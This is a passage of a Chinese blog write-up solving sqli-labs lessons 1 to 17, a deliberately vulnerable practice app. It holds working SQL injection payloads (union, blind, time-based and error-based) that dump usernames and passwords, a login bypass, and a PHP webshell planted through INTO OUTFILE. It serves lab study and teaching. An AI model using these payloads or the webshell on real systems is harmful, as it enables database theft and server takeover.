<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222105149607.png" alt="image-20220222105149607"></p>
<p>5.将id&#x3D;1改为一个数据库不存在的id值，如-1，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222105322845.png" alt="image-20220222105322845"></p>
<p>发现页面先输出了2和3，说明页面有2个显示位<br>6.然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息<br>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</span><br></pre></td></tr></table></figure>

<p>这是一个查询数据库名信息的语句</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222105530959.png" alt="image-20220222105530959"></p>
<p>查询security内的所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222105634045.png" alt="image-20220222105634045"></p>
<p>接着使用下面的语句爆破出列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2, group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222110021096.png" alt="image-20220222110021096"></p>
<p>接着使用如下语句查询所有的用户名，密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username) from security.users --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222110217671.png" alt="image-20220222110217671"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222110311198.png" alt="image-20220222110311198"></p>
<h3 id="Less-2-整型注入"><a href="#Less-2-整型注入" class="headerlink" title="Less-2 整型注入[]"></a>Less-2 整型注入[]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222112134879.png" alt="image-20220222112134879"></p>
<p>这里我们没有加入单引号，即为整型，发现less1和less2之间源码存在区别，即变量的赋值，其余注入一致</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222111954637.png" alt="image-20220222111954637"></p>
<h3 id="Less-3-单引号变形字符型注入-‘"><a href="#Less-3-单引号变形字符型注入-‘" class="headerlink" title="Less-3 单引号变形字符型注入[‘)]"></a>Less-3 单引号变形字符型注入[‘)]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223100105853.png" alt="image-20220223100105853"></p>
<p>1.输入单引号<code>?id=1&#39;</code></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223102958770.png" alt="image-20220223102958770"></p>
<p>根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，<code>&#39;1&#39;&#39;)limit 0,1</code>判断包裹为(‘ ‘)闭合，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) …，在第一题中id&#x3D;1‘的后面单引号加上），其它保持不变就行了</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223103319921.png" alt="image-20220223103319921"></p>
<p> 2.接着使用order by 判断表中有3列数据</p>
<p> 3.接着使用联合查询，union select 1，2，3 判断页面是否有显示位 </p>
<p>下面使用第一关用的查询语句测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223103540020.png" alt="image-20220223103540020"></p>
<h3 id="Less-4-双引号字符型注入-“"><a href="#Less-4-双引号字符型注入-“" class="headerlink" title="Less-4 双引号字符型注入[“)]"></a>Less-4 双引号字符型注入[“)]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223103730770.png" alt="image-20220223103730770"></p>
<p>将参数前后加入了双引号</p>
<p>传入单引号没有报错，试着传入双引号</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223103824333-1653724717407.png" alt="image-20220223103824333"></p>
<p>那么我们考虑如何将前面的闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223104512142.png" alt="image-20220223104512142"></p>
<p>这里它本身加入的双引号被注释掉了</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220223104700378.png" alt="image-20220223104700378"></p>
<h3 id="Less-5-双注入单引号字符型注入-‘"><a href="#Less-5-双注入单引号字符型注入-‘" class="headerlink" title="Less-5 双注入单引号字符型注入[‘]"></a>Less-5 双注入单引号字符型注入[‘]</h3><pre><code>关于时间的盲注
还可以进行xpath注入
</code></pre>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302104621315.png" alt="image-20220302104621315"></p>
<p>发现报错信息，第一反应事布尔型盲注，报错型注入，时间延迟型盲注了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>

<p>页面发现明显延迟，通过延迟依次爆数据库长度，数据库名，表名，列名，以及字段。</p>
<p>爆数据库长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302105014558.png" alt="image-20220302105014558"></p>
<p>出现延迟，所以数据库长度为8</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>明显延迟，数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)&#x3D;’security’</p>
<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;r&#x27; ,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>在limit 3,1 爆破出user表名为users.</p>
<p>爆列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),8)=&#x27;password&#x27; ,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>首先尝试定向爆破，以提高手工注入速度，修改limit x,1 中的x查询password是否存在表中，在limit 3,1的时候查到了password列，同样的方法查询username ，接下来爆破字段的值。</p>
<p>爆破值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select password from users order by id limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)--+</span><br><span class="line">?id=1&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-6-双引号字符型注入-“"><a href="#Less-6-双引号字符型注入-“" class="headerlink" title="Less-6 双引号字符型注入[“]"></a>Less-6 双引号字符型注入[“]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302105856847.png" alt="image-20220302105856847"></p>
<p>双引号字符型注入，上一题的单引号改成双引号就可以了</p>
<h3 id="Less-7-导出文件字符型注入-‘"><a href="#Less-7-导出文件字符型注入-‘" class="headerlink" title="Less-7 导出文件字符型注入[‘))]"></a>Less-7 导出文件字符型注入[‘))]</h3><p>当闭合语句时，发现<code>1&#39;))</code>可以闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302112103720.png" alt="image-20220302112103720"></p>
<p>我们从本关的标题了解到： dump into outfile,意思是本关我们利用文件导入的方式进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302112103720-1653724903069.png" alt="image-20220302112103720"></p>
<blockquote>
<p>1、secure_file_priv &#x3D; null # 表示不允许导入导出<br>2、secure_file_priv &#x3D; 路径时 # 表示mysql的导入导出只能发生在指定的文件夹<br>3、secure_file_priv &#x3D; # 不给值的时候，则表示没有任何限制</p>
</blockquote>
<p>如果是null，想得到导入导出权限，可以在mysql文件夹my.ini文件[mysqld]的后面加上secure_file_priv&#x3D;’’（两个英文单引号），然后重启phpstudy即可</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302114758206.png" alt="image-20220302114758206"></p>
<p>1.获取字段数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) order by 3 --+</span><br></pre></td></tr></table></figure>

<p>可知当前表有3个字段</p>
<p>2.导出数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,user(),database() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\aaa.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302162531191.png" alt="image-20220302162531191"></p>
<p>3.导出表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,table_name from information_schema.tables where table_schema=&#x27;security&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\bbb.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302163117270.png" alt="image-20220302163117270"></p>
<p>4.导出字段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\ccc.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302163249221.png" alt="image-20220302163249221"></p>
<p>5.导出数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select * from users into outfile&quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\ddd.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302163343997.png" alt="image-20220302163343997"></p>
<p>6.上传一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;mima&quot;])?&gt;&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\test.php&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302163617115.png" alt="image-20220302163617115"></p>
<p>使用蚁剑测试连接,密码即为“mima”</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302165603853.png" alt="image-20220302165603853"></p>
<p>点进去即可查看所有上传数据</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302165636107.png" alt="image-20220302165636107"></p>
<h3 id="Less-8-布尔型盲注-‘"><a href="#Less-8-布尔型盲注-‘" class="headerlink" title="Less-8  布尔型盲注[‘]"></a>Less-8  布尔型盲注[‘]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>

<p>产生回显，证明时布尔型，和less5一样，根据会先判断，可以通过&gt;&lt;比较自负大小加速爆破</p>
<p>爆库<code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code></p>
<p>库名长度<code>?id=1&#39; and length(database())=8--+</code>,确定库名为”security”</p>
<p>表名<code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code></p>
<p>列名<code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; --+</code></p>
<p>字段名<code>?id=1&#39; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+</code></p>
<p>用户名<code>?id=1&#39; and left((select username from users order by id limit 0,1),1)=&#39;d&#39; --+</code></p>
<h3 id="Less-9-延迟注入-‘"><a href="#Less-9-延迟注入-‘" class="headerlink" title="Less-9 延迟注入[‘]"></a>Less-9 延迟注入[‘]</h3><p>不管怎么输入，回显总是you are …</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302171648524.png" alt="image-20220302171648524"></p>
<p>这时，用延时注入</p>
<p>首先测试出数据库长度：<code>?id=1&#39; and if(length(database())&gt;7,sleep(3),1)--+</code><br>然后逐个测试数据库名：<code>?id=1&#39;and if(ascii(substr(database(),1,1))=115,sleep(3),1)--+</code><br>表名：<code>?id=1&#39;and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,sleep(3),1)--+</code><br>字段名：<code>?id=1&#39;and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105,sleep(3),1)--+</code><br>字段内容：<code>?id=1&#39;and if(ascii(substr((select username from security.users limit 0,1),1,1))=68,sleep(3),1)--+</code></p>
<h3 id="Less-10-延迟注入-“"><a href="#Less-10-延迟注入-“" class="headerlink" title="Less-10 延迟注入[“]"></a>Less-10 延迟注入[“]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302171753973.png" alt="image-20220302171753973"></p>
<p>这里改为双引号注入方法参照less9</p>
<h2 id="11-20POST传输"><a href="#11-20POST传输" class="headerlink" title="11~20POST传输"></a>11~20POST传输</h2><h3 id="Less-11-联合查询-‘"><a href="#Less-11-联合查询-‘" class="headerlink" title="Less-11 联合查询[‘]"></a>Less-11 联合查询[‘]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302172015288.png" alt="image-20220302172015288"></p>
<p>方法和get方法一样，只是换了数据传输方式</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302180425519.png" alt="image-20220302180425519"></p>
<p>使用万能密码时可以登录 <code>admin&#39; or 1 #)</code><br> 是一个dump用户，当然admin也可以登录</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302182400842.png" alt="image-20220302182400842"></p>
<p>发现只有2成立，3就不成立了</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302182617195.png" alt="image-20220302182617195"></p>
<p>发现回显12</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302182909533.png" alt="image-20220302182909533"></p>
<h3 id="Less-12-联合查询-“"><a href="#Less-12-联合查询-“" class="headerlink" title="Less-12 联合查询[“)]"></a>Less-12 联合查询[“)]</h3><p>发现双引号闭合</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302183449425.png" alt="image-20220302183449425"></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302183449425-1653725294553.png" alt="image-20220302183449425"></p>
<p>其余同less11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&quot;) union select version(),database()#&amp;passwd=123--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302225432716.png" alt="image-20220302225432716"></p>
<h3 id="Less-13-报错注入-‘"><a href="#Less-13-报错注入-‘" class="headerlink" title="Less-13 报错注入[‘)]"></a>Less-13 报错注入[‘)]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302224645007.png" alt="image-20220302224645007"></p>
<p>单引号报错，发现<code>&#39;)</code>可以闭合，因为登陆成功后没有发现任何回显</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220302224907642.png" alt="image-20220302224907642"></p>
<p>法二</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303101607829.png" alt="image-20220303101607829"></p>
<p>没有语句执行成功的回显数据，所以是post的盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and if(ascii(substr(database(),1,1))=115,sleep(3),1) #&amp;passwd=123--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303101003058.png" alt="image-20220303101003058"></p>
<p>页面出现明显延迟，可以参照less5进行盲注</p>
<p><strong>POST报错注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and updatexml(0x7e,concat(0x7e,database(),0x7e,version(),0x7e,user(),0x7e),0x7e) #&amp;passwd=123--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303102537480.png" alt="image-20220303102537480"></p>
<h3 id="Less-14-T单引号变形双注入"><a href="#Less-14-T单引号变形双注入" class="headerlink" title="Less-14 T单引号变形双注入"></a>Less-14 T单引号变形双注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303102108014.png" alt="image-20220303102108014"></p>
<p>和上一关一样，只是对参数做了不同的处理，闭合即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and if(ascii(substr(database(),1,1))=115,sleep(3),1) #&amp;passwd=123 #&amp;passwd=123--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303102326662.png" alt="image-20220303102326662"></p>
<h3 id="Less-15-bool型-x2F-时间盲注-‘"><a href="#Less-15-bool型-x2F-时间盲注-‘" class="headerlink" title="Less-15 bool型&#x2F;时间盲注[‘]"></a>Less-15 bool型&#x2F;时间盲注[‘]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303104629741.png" alt="image-20220303104629741"></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303104703412.png" alt="image-20220303104703412"></p>
<p>时间延迟测试payload</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">uname</span>=admin&#x27; and sleep(<span class="number">5</span>) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p>明显延迟，确定为延迟注入，爆库，表，列名，值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(length(database())=8,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin&#x27; and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"> </span><br><span class="line">uname=admin&#x27; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;r&#x27; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),8)=&#x27;password&#x27; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"> </span><br><span class="line">uname=admin&#x27; and if(left((select password from users order by id limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>



<h3 id="Less-16-bool型-x2F-时间延迟盲注-“"><a href="#Less-16-bool型-x2F-时间延迟盲注-“" class="headerlink" title="Less-16 bool型&#x2F;时间延迟盲注[“]"></a>Less-16 bool型&#x2F;时间延迟盲注[“]</h3><p>无论怎么输入都没有回显，判断为时间延迟注入</p>
<p>payload和less-15差不多，只需要把上一题正的单引号改为双引号加括号 “) 就完事了。</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303105347030.png" alt="image-20220303105347030"></p>
<h3 id="Less-17-报错注入-‘"><a href="#Less-17-报错注入-‘" class="headerlink" title="Less-17 报错注入[ ‘ ]"></a>Less-17 报错注入[ ‘ ]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303154346145.png" alt="image-20220303154346145"></p>
<p>我们可以看到，用户名被check_input 包裹了，而密码没有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>只截取15个字符</p>
<p><code>get_magic_quotes_gpc()</code></p>
<p>当magic_quotes_gpc&#x3D;On的时候，函数get_magic_quotes_gpc()就会返回1</p>
<p>当magic_quotes_gpc&#x3D;Off的时候，函数get_magic_quotes_gpc()就会返回0</p>
<p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>在magic_quotes_gpc &#x3D; On的情况下，如果输入的数据有</p>
<p><code>单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符</code>）等字符都会被加上反斜线。</p>
<p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p>
<p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p>
<p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>intval()     整型转换</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303160930640.png" alt="image-20220303160930640"></p>
</blockquote>
<p>爆库payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303161157961.png" alt="image-20220303161157961"></p>
<p>爆表名payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303161451990.png" alt="image-20220303161451990"></p>
<p>爆列名</p>
